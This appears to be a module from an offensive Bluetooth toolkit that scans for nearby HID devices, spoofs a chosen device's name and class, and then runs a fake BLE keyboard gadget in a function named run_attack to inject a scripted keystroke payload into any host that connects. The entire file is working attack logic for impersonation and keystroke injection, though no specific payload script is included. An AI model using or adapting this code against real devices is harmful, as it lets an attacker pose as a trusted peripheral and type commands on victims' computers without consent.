from __future__ import annotations

from bthj.bluez_cli import BluezCLIBackend
from bthj.hid_ble import (
    BluezHidGadget,
    count_keystrokes,
    describe_payload,
    parse_payload,
)
from bthj.models import Device
from bthj.spoof import spoof_class, spoof_name


def probe_identity(backend: BluezCLIBackend, target: str, timeout: int = 8) -> Device:
    devices = backend.discover(timeout, passive=False)
    dev = next((d for d in devices if d.address == target), None)
    if dev is None:
        dev = Device(address=target)
    return dev


def scan_for_identity(
    backend: BluezCLIBackend, timeout: int = 8, prefer_hid: bool = True
) -> Device | None:
    devices = backend.discover(timeout, passive=False)
    hid_devices = [
        d for d in devices
        if prefer_hid
        and any("hid" in (s or "").lower() for s in d.services)
    ]
    if hid_devices:
        hid_devices.sort(key=lambda d: d.rssi or -999, reverse=True)
        return hid_devices[0]
    devices_with_name = [d for d in devices if d.name and d.rssi is not None]
    if devices_with_name:
        devices_with_name.sort(key=lambda d: d.rssi or -999, reverse=True)
        return devices_with_name[0]
    return None


def clone_identity(backend: BluezCLIBackend, name: str, device_class: int | None = None) -> None:
    spoof_name(backend, name)
    if device_class is not None:
        spoof_class(backend, device_class)


def run_attack(
    backend: BluezCLIBackend,
    identity_name: str,
    identity_class: int | None = None,
    script_text: str = "",
    gadget_name: str | None = None,
    countdown: float = 0.0,
    timeout: float = 120.0,
    restore_after: bool = True,
    interval: float = 0.01,
    hold: float = 0.02,
    max_fires: int = 1,
    on_state=None,
) -> int:
    if on_state is None:
        on_state = lambda _msg: None

    info = backend.controller_info()
    orig_name = info.get("alias") or info.get("name")

    clone_identity(backend, identity_name, identity_class)
    on_state(f"cloned identity as '{identity_name}'")
    if identity_class is not None:
        on_state(f"class set to 0x{identity_class:06x}")

    actions = parse_payload(script_text, interval=interval, hold=hold)
    keys = count_keystrokes(actions)
    on_state(f"payload plan: {describe_payload(actions)}")
    if keys == 0:
        on_state("payload empty, aborting")
        if restore_after:
            backend.set_name(orig_name or "")
        return 0

    gadget = BluezHidGadget(name=gadget_name or identity_name)
    try:
        sent = gadget.run(
            actions,
            timeout=timeout,
            countdown=countdown,
            max_fires=max_fires,
            on_state=on_state,
        )
    except TimeoutError:
        on_state("timed out waiting for client")
        sent = 0
    except Exception as exc:  # noqa: BLE001
        on_state(f"error: {exc}")
        sent = 0
    finally:
        if restore_after:
            backend.set_name(orig_name or "")
            on_state(f"adapter restored to '{orig_name or ''}'")

    return sent
